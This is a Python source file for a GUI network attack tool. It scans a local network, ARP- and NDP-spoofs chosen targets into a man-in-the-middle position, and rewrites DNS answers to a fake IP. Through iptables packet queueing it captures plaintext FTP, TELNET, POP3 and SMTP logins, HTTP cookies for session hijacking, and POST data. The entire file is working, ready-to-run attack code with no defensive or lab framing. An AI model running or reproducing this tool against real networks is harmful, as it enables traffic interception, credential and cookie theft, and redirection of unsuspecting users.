#!/usr/bin/env python3

import os
import sys
import re
import threading
from urllib.parse import unquote, parse_qs, unquote_plus
import scapy.all as scapy
from netfilterqueue import NetfilterQueue
from PySide6.QtWidgets import (
    QApplication, QWidget, QVBoxLayout, QPushButton, QHBoxLayout, QLabel,
    QComboBox, QTextEdit, QTableWidget, QTableWidgetItem, QTabWidget, QHeaderView,
    QAbstractItemView, QMessageBox, QLineEdit, QFormLayout
)
from PySide6.QtGui import QIcon
from PySide6.QtCore import Qt, QThread, Signal
import socket
import time
import traceback  # Added for better error output

user_fields = [
    "phone", "user_pass", "uname", "user_login", "user_name", "email",
    "pseudonym", "userid", "login", "user", "username"
]
pass_fields = [
    "pass", "passwd", "passwrd", "login_password", "pwd", "passphrase",
    "password", "user_password", "pswd", "userpwd", "upass", "pwd1",
    "secure_pass", "auth_pass", "mypassword", "account_password"
]

def enable_ip_forward():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def disable_ip_forward():
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def enable_ipv6_forward():
    os.system("echo 1 > /proc/sys/net/ipv6/conf/all/forwarding")

def disable_ipv6_forward():
    os.system("echo 0 > /proc/sys/net/ipv6/conf/all/forwarding")

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None

def get_vendor(mac):
    try:
        import requests
        resp = requests.get(f"https://api.macvendors.com/{mac}", timeout=2)
        if resp.status_code == 200:
            return resp.text.strip()
        return ""
    except Exception:
        return ""

def scan_network(interface, log_cb, ipv6=False):
    devices = []
    try:
        if ipv6:
            log_cb("Starting IPv6 scan...")
            try:
                ans, _ = scapy.srp(
                    scapy.Ether(dst="33:33:00:00:00:01") / scapy.IPv6(dst="ff02::1") / scapy.ICMPv6ND_NS(),
                    timeout=3, iface=interface, verbose=False
                )
                for snd, rcv in ans:
                    ip = rcv[scapy.IPv6].src
                    mac = rcv[scapy.Ether].src
                    vendor = get_vendor(mac)
                    devices.append((ip, mac, vendor))
            except Exception as ex:
                log_cb(f"IPv6 scan failed: {ex}")
        else:
            log_cb("Starting IPv4 scan...")
            iface_ip = scapy.get_if_addr(interface)
            if iface_ip == "0.0.0.0":
                log_cb(f"Interface {interface} has no IP address.")
                return devices
            net = ".".join(iface_ip.split(".")[:3]) + ".1/24"
            answered, _ = scapy.arping(net, iface=interface, timeout=2, verbose=False)
            for snd, rcv in answered:
                ip = rcv.psrc
                mac = rcv.hwsrc
                vendor = get_vendor(mac)
                devices.append((ip, mac, vendor))
    except Exception as e:
        log_cb(f"Network scan error: {e}")
    return devices

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        return False
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)
    return True

def restore(target_ip, source_ip):
    target_mac = get_mac(target_ip)
    source_mac = get_mac(source_ip)
    if not target_mac or not source_mac:
        return
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
                       psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=5, verbose=False)

def ndp_spoof(target_ipv6, router_ipv6, iface, stop_event, log_cb):
    log_cb("Starting NDP spoofing...")
    router_mac = scapy.get_if_hwaddr(iface)
    target_mac = get_mac_v6(target_ipv6, iface)
    if not target_mac:
        log_cb(f"Failed to get target MAC for {target_ipv6}")
        return
    pkt = scapy.Ether(dst=target_mac) / scapy.IPv6(dst=target_ipv6, src=router_ipv6) / \
        scapy.ICMPv6ND_NA(tgt=router_ipv6, R=0, S=1, O=1) / \
        scapy.ICMPv6NDOptDstLLAddr(lladdr=router_mac)
    try:
        while not stop_event.is_set():
            scapy.sendp(pkt, iface=iface, verbose=False)
            time.sleep(2)
    except Exception as e:
        log_cb(f"NDP spoofing error: {e}")

def get_mac_v6(ipv6, iface):
    ns = scapy.Ether(dst="33:33:ff:" + ":".join(ipv6.split(":")[-3:])) / \
        scapy.IPv6(dst=ipv6) / scapy.ICMPv6ND_NS(tgt=ipv6)
    ans = scapy.srp(ns, iface=iface, timeout=2, verbose=False)[0]
    for snd, rcv in ans:
        if scapy.ICMPv6ND_NA in rcv:
            return rcv[scapy.Ether].src
    return None

class MITMThread(QThread):
    log = Signal(str)
    finished = Signal()
    def __init__(self, targets, router_ip, iface, dns_spoof_domains=None, dns_spoof_ip=None):
        super().__init__()
        self.targets = targets
        self.router_ip = router_ip
        self.iface = iface
        self._stop_event = threading.Event()
        self.dns_spoof_domains = dns_spoof_domains or []
        self.dns_spoof_ip = dns_spoof_ip

    def run(self):
        self.log.emit("Starting ARP spoofing (MITM)...")
        try:
            while not self._stop_event.is_set():
                for target_ip in self.targets:
                    spoof(target_ip, self.router_ip)
                    spoof(self.router_ip, target_ip)
                time.sleep(2)
        except Exception as e:
            self.log.emit(f"MITM error: {e}")
        finally:
            self.log.emit("Restoring ARP tables...")
            for target_ip in self.targets:
                restore(target_ip, self.router_ip)
                restore(self.router_ip, target_ip)
            self.finished.emit()

    def stop(self):
        self._stop_event.set()

class NDPSpoofThread(QThread):
    log = Signal(str)
    finished = Signal()
    def __init__(self, targets, router_v6, iface):
        super().__init__()
        self.targets = targets
        self.router_v6 = router_v6
        self.iface = iface
        self._stop_event = threading.Event()

    def run(self):
        self.log.emit("Starting NDP spoofing (IPv6 MITM)...")
        try:
            for target in self.targets:
                ndp_spoof(target, self.router_v6, self.iface, self._stop_event, self.log.emit)
        except Exception as e:
            self.log.emit(f"NDP MITM error: {e}")
        finally:
            self.finished.emit()

    def stop(self):
        self._stop_event.set()

class DNSPacketInterceptor:
    def __init__(self, domains_to_spoof, spoof_ip, log_cb):
        self.domains_to_spoof = domains_to_spoof
        self.spoof_ip = spoof_ip
        self.log_cb = log_cb

    def intercept(self, packet):
        try:
            scapy_packet = scapy.IP(packet.get_payload())
            if scapy_packet.haslayer(scapy.DNSQR):
                qname = scapy_packet[scapy.DNSQR].qname.decode()
                self.log_cb(f"DNS Query: {qname}")
                spoofed = False
                for domain in self.domains_to_spoof:
                    if domain in qname:
                        spoofed = True
                        break
                if spoofed:
                    self.log_cb(f"DNS Spoofing: {qname} -> {self.spoof_ip}")
                    answer = scapy.DNSRR(rrname=scapy_packet[scapy.DNSQR].qname, rdata=self.spoof_ip)
                    dns = scapy.DNS(
                        id=scapy_packet[scapy.DNS].id,
                        qr=1, aa=1, qd=scapy_packet[scapy.DNS].qd,
                        an=answer, ancount=1
                    )
                    newpkt = scapy.IP(dst=scapy_packet[scapy.IP].src, src=scapy_packet[scapy.IP].dst) / \
                        scapy.UDP(dport=scapy_packet[scapy.UDP].sport, sport=53) / dns
                    packet.set_payload(bytes(newpkt))
        except Exception as e:
            self.log_cb(f"DNSPacketInterceptor error: {e}")
        packet.accept()

class PacketCaptureThread(QThread):
    log = Signal(str)
    finished = Signal()
    def __init__(self, targets, iface, dns_spoof_domains=None, dns_spoof_ip=None, queue_num=1):
        super().__init__()
        self.targets = targets
        self.iface = iface
        self._stop_event = threading.Event()
        self.nfqueue = NetfilterQueue()
        self._iptables_set = False
        self.dns_interceptor = DNSPacketInterceptor(dns_spoof_domains or [], dns_spoof_ip, self.log.emit)
        self.session_hijacked = set()
        self.capture_protocols = {
            21: 'FTP', 23: 'TELNET', 25: 'SMTP', 110: 'POP3', 143: 'IMAP'
        }
        self.queue_num = queue_num  # Make queue number configurable

    def process_packet(self, packet):
        try:
            scapy_packet = scapy.IP(packet.get_payload())
            # DNS spoof and sniff
            if scapy_packet.haslayer(scapy.DNSQR):
                self.dns_interceptor.intercept(packet)
                return
            # HTTP/FTP/POP3/SMTP/TELNET sniffing
            if scapy_packet.haslayer(scapy.TCP):
                dport = scapy_packet[scapy.TCP].dport
                sport = scapy_packet[scapy.TCP].sport
                proto = self.capture_protocols.get(dport) or self.capture_protocols.get(sport)
                if proto:
                    if scapy_packet.haslayer(scapy.Raw):
                        payload = scapy_packet[scapy.Raw].load.decode('latin-1', errors='ignore')
                        self.log.emit(f"[{proto}] {scapy_packet[scapy.IP].src}:{sport}->{dport}: {payload.strip()}")
                        if proto in ["FTP", "TELNET", "POP3", "SMTP"]:
                            if "USER" in payload or "PASS" in payload:
                                self.log.emit(f"[HIJACK] Possible credentials: {payload.strip()}")
                # HTTP session hijack (Cookie theft) and full HTTP decode
                if dport == 80 or sport == 80:
                    if scapy_packet.haslayer(scapy.Raw):
                        payload = scapy_packet[scapy.Raw].load.decode('latin-1', errors='ignore')
                        lines = payload.split("\r\n")
                        if lines:
                            request_line = lines[0]
                            if request_line.startswith(("GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS", "PATCH")):
                                self.log.emit(f"[HTTP] Request: {request_line}")
                                method, path, *_ = request_line.split()
                                host = None
                                headers = {}
                                i = 1
                                while i < len(lines) and lines[i]:
                                    if ": " in lines[i]:
                                        key, value = lines[i].split(": ", 1)
                                        headers[key] = value
                                        if key.lower() == "host":
                                            host = value
                                    i += 1
                                for k, v in headers.items():
                                    self.log.emit(f"[HTTP] Header: {k}: {v}")
                                if host:
                                    url = f"http://{host}{path}"
                                    self.log.emit(f"[HTTP] Full URL: {url}")
                                if method == "GET" and "?" in path:
                                    params = path.split("?", 1)[1]
                                    parsed = parse_qs(params)
                                    self.log.emit(f"[HTTP] GET Params: {parsed}")
                                if "Cookie" in headers:
                                    self.log.emit(f"[HTTP] Cookies: {headers['Cookie']}")
                                    if (scapy_packet[scapy.IP].src, scapy_packet[scapy.IP].dst) not in self.session_hijacked:
                                        self.session_hijacked.add((scapy_packet[scapy.IP].src, scapy_packet[scapy.IP].dst))
                                        self.log.emit(f"[SESSION HIJACK] Cookie: {headers['Cookie']}")
                                if method == "POST":
                                    if "" in lines:
                                        idx = lines.index("")
                                        post_body = "\r\n".join(lines[idx+1:])
                                        parsed_post = parse_qs(post_body)
                                        self.log.emit(f"[HTTP] POST Data: {parsed_post}")
            packet.accept()
        except Exception as ex:
            self.log.emit(f"Packet processing error: {ex}")
            packet.accept()

    def run(self):
        try:
            os.system("modprobe nfnetlink_queue")  # Ensure kernel module is loaded
            enable_ip_forward()
            self._iptables_set = True
            for target in self.targets:
                os.system(f"iptables -I FORWARD -i {self.iface} -s {target} -j NFQUEUE --queue-num {self.queue_num}")
                os.system(f"iptables -I FORWARD -o {self.iface} -d {target} -j NFQUEUE --queue-num {self.queue_num}")
            self.log.emit("Packet capture started. MITM running.")
            try:
                self.nfqueue.bind(self.queue_num, self.process_packet)
            except Exception as queue_ex:
                self.log.emit(f"Capture error: Failed to create queue {self.queue_num}. Is another program using it? Is the kernel module loaded?")
                self.log.emit("Full traceback:\n" + traceback.format_exc())
                return
            self.nfqueue.run()
        except Exception as ex:
            self.log.emit(f"Capture error: {ex}\n{traceback.format_exc()}")
        finally:
            try:
                self.nfqueue.unbind()
            except:
                pass
            if self._iptables_set:
                for target in self.targets:
                    os.system(f"iptables -D FORWARD -i {self.iface} -s {target} -j NFQUEUE --queue-num {self.queue_num}")
                    os.system(f"iptables -D FORWARD -o {self.iface} -d {target} -j NFQUEUE --queue-num {self.queue_num}")
            disable_ip_forward()
            self.finished.emit()

    def stop(self):
        try:
            self.nfqueue.unbind()
        except:
            pass
        self._stop_event.set()

class PortStealerThread(QThread):
    log = Signal(str)
    finished = Signal()
    def __init__(self, iface, targets, port=80):
        super().__init__()
        self.iface = iface
        self.targets = targets
        self.port = port
        self._stop = threading.Event()
        self._server_socket = None

    def run(self):
        self.log.emit(f"Starting port stealing on port {self.port} (advanced)...")
        try:
            for t in self.targets:
                spoof(t, scapy.get_if_addr(self.iface))
            self._server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._server_socket.bind(('', self.port))
            self._server_socket.listen(5)
            self.log.emit(f"Bound to port {self.port}, now accepting connections for stealing...")
            self._server_socket.settimeout(1.0)
            while not self._stop.is_set():
                try:
                    conn, addr = self._server_socket.accept()
                    self.log.emit(f"Connection from {addr}")
                    conn.close()
                except socket.timeout:
                    continue
        except Exception as e:
            self.log.emit(f"Error in port stealer: {e}")
        finally:
            if self._server_socket:
                try:
                    self._server_socket.close()
                except:
                    pass
            self.finished.emit()

    def stop(self):
        self._stop.set()
        if self._server_socket:
            try:
                self._server_socket.close()
            except Exception:
                pass

class MainWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Network Scanner & MITM GUI")
        self.setWindowIcon(QIcon.fromTheme("network-workgroup"))
        self.resize(1100, 800)
        self.tabs = QTabWidget()
        self.scan_tab = QWidget()
        self.portsteal_tab = QWidget()
        self.ndp_tab = QWidget()
        self.tabs.addTab(self.scan_tab, QIcon.fromTheme("network-wireless"), "Scanner / MITM")
        self.tabs.addTab(self.portsteal_tab, QIcon.fromTheme("network-server"), "Port Stealer")
        self.tabs.addTab(self.ndp_tab, QIcon.fromTheme("network-vpn"), "NDP Spoof (IPv6)")

        self.init_scan_tab()
        self.init_portsteal_tab()
        self.init_ndp_tab()

        main_layout = QVBoxLayout()
        main_layout.addWidget(self.tabs)
        self.setLayout(main_layout)

        self.current_iface = None
        self.devices = []
        self.selected_router = None
        self.selected_targets = []
        self.selected_router_v6 = None
        self.selected_targets_v6 = []
        self.mitm_thread = None
        self.capture_thread = None
        self.portsteal_thread = None
        self.ndp_thread = None

    def init_scan_tab(self):
        layout = QVBoxLayout()
        iface_layout = QHBoxLayout()
        iface_label = QLabel("Interface:")
        self.iface_box = QComboBox()
        for iface in scapy.get_if_list():
            self.iface_box.addItem(iface)
        iface_layout.addWidget(iface_label)
        iface_layout.addWidget(self.iface_box)
        self.scan_ipv4_btn = QPushButton(QIcon.fromTheme("network-wireless"), "Scan IPv4")
        self.scan_ipv6_btn = QPushButton(QIcon.fromTheme("network-vpn"), "Scan IPv6")
        iface_layout.addWidget(self.scan_ipv4_btn)
        iface_layout.addWidget(self.scan_ipv6_btn)
        layout.addLayout(iface_layout)

        self.device_table = QTableWidget(0, 3)
        self.device_table.setHorizontalHeaderLabels(["IP", "MAC", "Vendor"])
        self.device_table.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.device_table.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.device_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        layout.addWidget(self.device_table)

        sel_layout = QHBoxLayout()
        self.router_lbl = QLabel("Router: None")
        self.targets_lbl = QLabel("Targets: None")
        sel_layout.addWidget(self.router_lbl)
        sel_layout.addWidget(self.targets_lbl)
        layout.addLayout(sel_layout)

        self.dns_spoof_form = QFormLayout()
        self.dns_domain_line = QLineEdit()
        self.dns_ip_line = QLineEdit()
        self.dns_spoof_form.addRow("Domain to spoof (comma separated):", self.dns_domain_line)
        self.dns_spoof_form.addRow("Fake IP for DNS spoof:", self.dns_ip_line)
        layout.addLayout(self.dns_spoof_form)

        btn_layout = QHBoxLayout()
        self.set_router_btn = QPushButton(QIcon.fromTheme("network-server"), "Set as Router")
        self.add_target_btn = QPushButton(QIcon.fromTheme("user-group-properties"), "Add as Target")
        self.start_mitm_btn = QPushButton(QIcon.fromTheme("media-playback-start"), "Start MITM + Capture")
        self.stop_mitm_btn = QPushButton(QIcon.fromTheme("media-playback-stop"), "Stop")
        btn_layout.addWidget(self.set_router_btn)
        btn_layout.addWidget(self.add_target_btn)
        btn_layout.addWidget(self.start_mitm_btn)
        btn_layout.addWidget(self.stop_mitm_btn)
        layout.addLayout(btn_layout)

        self.log_text = QTextEdit()
        self.log_text.setReadOnly(True)
        layout.addWidget(QLabel("Activity Log:"))
        layout.addWidget(self.log_text)

        self.scan_tab.setLayout(layout)

        self.scan_ipv4_btn.clicked.connect(lambda: self.do_scan(ipv6=False))
        self.scan_ipv6_btn.clicked.connect(lambda: self.do_scan(ipv6=True))
        self.set_router_btn.clicked.connect(self.set_as_router)
        self.add_target_btn.clicked.connect(self.add_as_target)
        self.start_mitm_btn.clicked.connect(self.start_mitm)
        self.stop_mitm_btn.clicked.connect(self.stop_mitm)

    def init_portsteal_tab(self):
        layout = QVBoxLayout()
        self.portsteal_start_btn = QPushButton(QIcon.fromTheme("media-record"), "Start Port Stealing")
        self.portsteal_stop_btn = QPushButton(QIcon.fromTheme("media-playback-stop"), "Stop")
        self.portsteal_log = QTextEdit()
        self.portsteal_log.setReadOnly(True)
        layout.addWidget(self.portsteal_start_btn)
        layout.addWidget(self.portsteal_stop_btn)
        layout.addWidget(QLabel("Port Stealer Log:"))
        layout.addWidget(self.portsteal_log)
        self.portsteal_tab.setLayout(layout)
        self.portsteal_start_btn.clicked.connect(self.start_portsteal)
        self.portsteal_stop_btn.clicked.connect(self.stop_portsteal)

    def init_ndp_tab(self):
        layout = QVBoxLayout()
        self.ndp_iface_box = QComboBox()
        for iface in scapy.get_if_list():
            self.ndp_iface_box.addItem(iface)
        layout.addWidget(QLabel("IPv6 Interface:"))
        layout.addWidget(self.ndp_iface_box)
        self.ndp_router_line = QLineEdit()
        self.ndp_targets_line = QLineEdit()
        layout.addWidget(QLabel("Router IPv6:"))
        layout.addWidget(self.ndp_router_line)
        layout.addWidget(QLabel("Targets IPv6 (comma separated):"))
        layout.addWidget(self.ndp_targets_line)
        self.ndp_start_btn = QPushButton("Start NDP MITM")
        self.ndp_stop_btn = QPushButton("Stop NDP MITM")
        self.ndp_log = QTextEdit()
        self.ndp_log.setReadOnly(True)
        layout.addWidget(self.ndp_start_btn)
        layout.addWidget(self.ndp_stop_btn)
        layout.addWidget(QLabel("NDP Activity Log:"))
        layout.addWidget(self.ndp_log)
        self.ndp_tab.setLayout(layout)
        self.ndp_start_btn.clicked.connect(self.start_ndp_spoof)
        self.ndp_stop_btn.clicked.connect(self.stop_ndp_spoof)

    def log(self, msg):
        self.log_text.append(msg)

    def do_scan(self, ipv6=False):
        iface = self.iface_box.currentText()
        self.device_table.setRowCount(0)
        self.devices = scan_network(iface, self.log, ipv6=ipv6)
        for ip, mac, vendor in self.devices:
            row = self.device_table.rowCount()
            self.device_table.insertRow(row)
            self.device_table.setItem(row, 0, QTableWidgetItem(str(ip)))
            self.device_table.setItem(row, 1, QTableWidgetItem(str(mac)))
            self.device_table.setItem(row, 2, QTableWidgetItem(str(vendor)))
        self.log(f"Scan complete: {len(self.devices)} devices.")

    def set_as_router(self):
        rows = self.device_table.selectionModel().selectedRows()
        if rows:
            ip = self.device_table.item(rows[0].row(), 0).text()
            self.selected_router = ip
            self.router_lbl.setText(f"Router: {ip}")
            self.log(f"Router set to {ip}")

    def add_as_target(self):
        rows = self.device_table.selectionModel().selectedRows()
        if rows:
            ip = self.device_table.item(rows[0].row(), 0).text()
            if ip == self.selected_router:
                QMessageBox.warning(self, "Invalid Target", "Cannot add the router as target.")
                return
            if ip not in self.selected_targets and len(self.selected_targets) < 5:
                self.selected_targets.append(ip)
                self.targets_lbl.setText(f"Targets: {', '.join(self.selected_targets)}")
                self.log(f"Added target: {ip}")

    def start_mitm(self):
        if not self.selected_router or not self.selected_targets:
            QMessageBox.warning(self, "Missing", "Select a router and at least one target.")
            return
        iface = self.iface_box.currentText()
        domains = [d.strip() for d in self.dns_domain_line.text().split(",") if d.strip()]
        fake_ip = self.dns_ip_line.text().strip()
        self.mitm_thread = MITMThread(self.selected_targets, self.selected_router, iface, dns_spoof_domains=domains, dns_spoof_ip=fake_ip)
        self.mitm_thread.log.connect(self.log)
        self.mitm_thread.finished.connect(lambda: self.log("MITM thread finished."))
        self.mitm_thread.start()
        self.capture_thread = PacketCaptureThread(self.selected_targets, iface, dns_spoof_domains=domains, dns_spoof_ip=fake_ip)
        self.capture_thread.log.connect(self.log)
        self.capture_thread.finished.connect(lambda: self.log("Capture thread finished."))
        self.capture_thread.start()
        self.log("MITM + packet capture started.")

    def stop_mitm(self):
        if self.mitm_thread:
            self.mitm_thread.stop()
            self.mitm_thread.wait()
            self.mitm_thread = None
        if self.capture_thread:
            self.capture_thread.stop()
            self.capture_thread.wait()
            self.capture_thread = None
        self.log("MITM + packet capture stopped.")

    def start_portsteal(self):
        if not self.selected_targets:
            QMessageBox.warning(self, "No Targets", "Add at least one target in the Scanner tab.")
            return
        iface = self.iface_box.currentText()
        self.portsteal_thread = PortStealerThread(iface, self.selected_targets)
        self.portsteal_thread.log.connect(self.portsteal_log.append)
        self.portsteal_thread.finished.connect(lambda: self.portsteal_log.append("Port Stealing finished."))
        self.portsteal_thread.start()
        self.portsteal_log.append("Port stealing started.")

    def stop_portsteal(self):
        if self.portsteal_thread:
            self.portsteal_thread.stop()
            self.portsteal_thread.wait()
            self.portsteal_thread = None
        self.portsteal_log.append("Port stealing stopped.")

    def start_ndp_spoof(self):
        iface = self.ndp_iface_box.currentText()
        router = self.ndp_router_line.text().strip()
        targets = [t.strip() for t in self.ndp_targets_line.text().split(",") if t.strip()]
        if not router or not targets:
            QMessageBox.warning(self, "Missing", "Enter router IPv6 and at least one target IPv6.")
            return
        self.ndp_thread = NDPSpoofThread(targets, router, iface)
        self.ndp_thread.log.connect(self.ndp_log.append)
        self.ndp_thread.finished.connect(lambda: self.ndp_log.append("NDP MITM finished."))
        self.ndp_thread.start()
        self.ndp_log.append("NDP spoof started.")

    def stop_ndp_spoof(self):
        if self.ndp_thread:
            self.ndp_thread.stop()
            self.ndp_thread.wait()
            self.ndp_thread = None
        self.ndp_log.append("NDP spoof stopped.")

    def closeEvent(self, event):
        if self.mitm_thread:
            self.mitm_thread.stop()
            self.mitm_thread.wait()
            self.mitm_thread = None
        if self.capture_thread:
            self.capture_thread.stop()
            self.capture_thread.wait()
            self.capture_thread = None
        if self.portsteal_thread:
            self.portsteal_thread.stop()
            self.portsteal_thread.wait()
            self.portsteal_thread = None
        if self.ndp_thread:
            self.ndp_thread.stop()
            self.ndp_thread.wait()
            self.ndp_thread = None
        event.accept()

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] Please run as root")
        sys.exit(1)
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec())
